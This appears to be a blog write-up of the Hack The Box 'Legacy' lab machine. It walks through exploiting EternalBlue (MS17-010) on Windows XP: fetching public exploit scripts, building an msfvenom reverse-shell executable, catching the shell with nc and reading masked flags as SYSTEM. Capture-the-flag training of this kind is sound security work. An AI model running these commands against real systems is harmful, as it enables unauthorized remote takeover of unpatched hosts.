---
title: Hack The Box - Legacy (Without Metasploit)
date: 2021-01-12 14:00:00 +0800
categories: [hackthebox]
tags: [windows, eternalblue]
---

![](/assets/images/legacy.png){:height="414px" width="615px"}

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.4 legacy.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

```bash 
$ nmap -sT -sV -sC -Pn -p- legacy.htb  
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-10 08:13 EST
Nmap scan report for legacy.htb (10.10.10.4)
Host is up (0.010s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: -4h00m00s, deviation: 1h24m51s, median: -5h00m00s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:87:21 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-01-10T12:13:27+02:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.34 seconds
```

# Enumeration (1)

## Port 445 `Windows XP microsoft-ds`

If we use the `smb-vuln-*` scripts of `nmap`, we see that it has some vulnerabilities.

```bash
$ nmap -Pn -p 445 --script smb-vuln-* legacy.htb  
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-10 08:17 EST
Nmap scan report for legacy.htb (10.10.10.4)
Host is up (0.013s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 7.35 seconds
```

# Exploitation (1)

Out of these 2 vulnerabilties, I will be picking `CVE-2017-0143`, or better known as `EternalBlue`. `Metasploit` has modules that exploit this vulnerability but I will be using some scripts that I found on Github that are able to do the same job.

```bash
$ mkdir eternalblue
$ curl https://raw.githubusercontent.com/helviojunior/MS17-010/master/send_and_execute.py > eternalblue/send_and_execute.py
$ curl https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py > eternalblue/mysmb.py
$ curl https://raw.githubusercontent.com/worawit/MS17-010/master/checker.py > eternalblue/checker.py
```

Exploiting `EternalBlue` requires us to find an accessible named pipe, so lets run `checker.py`.

```bash
$ python checker.py 10.10.10.4
Target OS: Windows 5.1
The target is not patched

=== Testing named pipes ===
spoolss: Ok (32 bit)
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: Ok (32 bit)
```

It seems there are 2 named pipes we can use and note that the machine is `32-bit`. Now we just need to prepare an executable that establishes a reverse shell connection back to us when executed. We can use msfvenom for this.

```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f exe > reverse.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

Now that is done, we setup our `nc` listener.

```bash
$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
```

Then finally we can exploit the vulnerability with `send_and_execute.py` and specifying our executable and the name of the named pipe we want to use.

```bash
$ python send_and_execute.py legacy.htb reverse.exe 445 browser 
Trying to connect to legacy.htb:445
Target OS: Windows 5.1
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x8230d230
SESSION: 0xe16bcf58
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe16beb90
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe16bec30
overwriting token UserAndGroups
Sending file GC726C.exe...
Opening SVCManager on legacy.htb.....
Creating service nrNL.....
Starting service nrNL.....
The NETBIOS connection with the remote host timed out.
Removing service nrNL.....
ServiceExec Error on: legacy.htb
nca_s_proto_error
Done
```

On our listener that we setup beforehand, we receive a connection.

```bash
$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.4] 1028
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32> whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.
```

Unfortunately there is no `whoami.exe` but we can run `SMB` server using `smbserver.py` from [`impacket`](https://github.com/SecureAuthCorp/impacket) and share a copy of `whoami.exe` which we can retrieve from `/usr/share/windows-resources/binaries/`.

```bash
$ cd /usr/share/windows-resources/binaries/
$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Then from the shell we got, we can do this to verify the current user.

```
C:\WINDOWS\system32> \\10.10.XX.XX\kali\whoami.exe
NT AUTHORITY\SYSTEM
```

Alright, we got `SYSTEM`!

# user.txt

The user flag is located at the home directory of `john`.

```
C:\Documents and Settings\john\Desktop> type user.txt
e69aXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

# root.txt

The root flag is located at the home directory of `Administrator`, as always.

```
C:\Documents and Settings\Administrator\Desktop> type root.txt
9934XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

### Rooted ! Thank you for reading and look forward for more writeups and articles !